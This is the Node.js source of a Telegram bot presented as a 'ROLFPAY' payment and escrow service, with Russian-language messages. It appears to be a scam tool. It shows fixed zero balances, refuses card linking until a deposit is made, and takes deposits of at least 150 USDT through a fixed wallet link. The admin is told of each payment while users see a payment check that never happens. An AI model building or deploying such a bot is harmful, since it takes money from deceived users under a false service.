require("dotenv").config();

const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env.API_KEY_BOT, { polling: true });

let users = {};

bot.on('message', msg => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name;

    if (!users[chatId]) {
        users[chatId] = {
            username: userName,
            registrationDate: new Date(),
            hasAccess: false,
            msgAddCardId: null,
            currency: 'USD' // default currency
        };

        // Send notification to admin about new user
        const adminChatId = process.env.ADMIN_CHAT_ID;
        const newUserNotification = `Новый пользователь присоединился: ${userName} (ID: ${chatId})`;
        bot.sendMessage(adminChatId, newUserNotification);
    }

    if (msg.text === '/start') {
        if (users[chatId].hasAccess) {
            showMenu(chatId);
        } else {
            bot.sendMessage(chatId, "Введите ключ доступа: ");
        }
    } else if (msg.text === process.env.ACCESS_KEY) {
        users[chatId].hasAccess = true;
        bot.sendMessage(chatId, 'Доступ разрешен!', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Меню', callback_data: 'menu' }]
                ]
            }
        });
    } else if (msg.text && !isNaN(msg.text)) {
        const depositAmount = parseFloat(msg.text);
        if (depositAmount < 150) {
            bot.sendMessage(chatId, 'Введите минимальный депозит 150');
        } else {
            const depositMessage = `Отправьте USDT на сумму: ${depositAmount} USDT \n`;
            const link = 't.me/send?start=IVzc4OQKS95F';
            bot.sendMessage(chatId, `${depositMessage}\n${link}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💸 Оплата отправлена', callback_data: 'deposit_accept' }],
                        [{ text: '🏠 Меню', callback_data: 'menu' }]
                    ]
                }
            });
        }
    }
}); 
bot.on('callback_query', query => {
    const chatId = query.message.chat.id;

    if (query.data === 'menu') {
        if (users[chatId].msgAddCardId) {
            bot.deleteMessage(chatId, users[chatId].msgAddCardId);
            delete users[chatId].msgAddCardId;
        }
        bot.deleteMessage(chatId, query.message.message_id);
        showMenu(chatId);
    } else if (query.data === 'add_card') {
        const msgAddCard = bot.sendMessage(chatId, 'Привязка карт недоступна, внесите депозит.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: `🏠 Меню`, callback_data: 'menu' }]
                ]
            }
        });
        msgAddCard.then(sentMessage => {
            users[chatId].msgAddCardId = sentMessage.message_id;
        });
    } else if (query.data === 'deposit') {
        bot.sendMessage(chatId, 'Введите сумму депозита в USD:');
    } else if (query.data === 'my_deals') {
        bot.sendMessage(chatId, 'У вас пока нет сделок', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Меню', callback_data: 'menu' }]
                ]
            }
        });
    } else if (query.data === 'dollars' || query.data === 'rubles' || query.data === 'grivnes') {
        users[chatId].currency = query.data; 
        showMenu(chatId);
    } else if (query.data === 'options') {
        bot.sendMessage(chatId, `Выберите валюту:`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '$', callback_data: 'dollars' }],
                    [{ text: '₽', callback_data: 'rubles' }],
                    [{ text: '₴', callback_data: 'grivnes' }]
                ]
            }
        });
        bot.deleteMessage(chatId, query.message.message_id);
    } else if (query.data === 'deposit_accept') {
        const adminChatId = process.env.ADMIN_CHAT_ID;
        const depositAmount = parseFloat(query.message.text.split('Отправьте USDT на сумму: ')[1].split(' USDT')[0]);
        const depositConfirmationMessage = `Пользователь с ID ${chatId} отправил депозит на сумму: ${depositAmount} USDT`;
        bot.deleteMessage(chatId, query.message.message_id);
 // Отправляем уведомление администратору 
        bot.sendMessage(adminChatId, depositConfirmationMessage).then(() => {
            setTimeout(() => {
                const paymentCheckMessage = '💰 Проверка оплаты...';
                bot.sendMessage(chatId, paymentCheckMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🏠 Меню', callback_data: 'menu' }]
                        ]
                    }
                });
            }, 5000);
        });
    } else if (query.data === 'guarant') {
        bot.sendMessage(chatId, 'Гарант @garantROLFPAY', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Меню', callback_data: 'menu' }]
                ]
            }
        });
    }
});


function showMenu(chatId) {
const user = users[chatId];
let balanceText;
switch (user.currency) {
case 'rubles':
balanceText = `Ваш баланс: 0₽`;
break;
case 'grivnes':
balanceText = `Ваш баланс: 0₴`;
break;
default:
balanceText = `Ваш баланс: 0$`;
}    
const menuMessage = `
<b>ROLFPAY BOT MENU</b>

Добрый день, ${user.username}!

Ваш ID: ${chatId}

${balanceText}
Ваши сделки: 0 
Ваши карты: 0
Дата регистрации: ${user.registrationDate.toLocaleDateString()}`;
bot.sendMessage(chatId, menuMessage, { 
    parse_mode: 'HTML', reply_markup: {
        inline_keyboard: [
            [{ text: `💳 Добавить карту`, callback_data: 'add_card' }],
            [{ text: `💰 Пополнить Баланс`, callback_data: 'deposit' }],
            [{ text: `🔑 Мои сделки`, callback_data: 'my_deals' }],
            [{ text: `⚙️ Настройки`, callback_data: 'options' }],
            [{ text: `🛡️ Гарант`, callback_data: 'guarant' }] // Добавляем кнопку "Гарант"
        ]
    }

});
}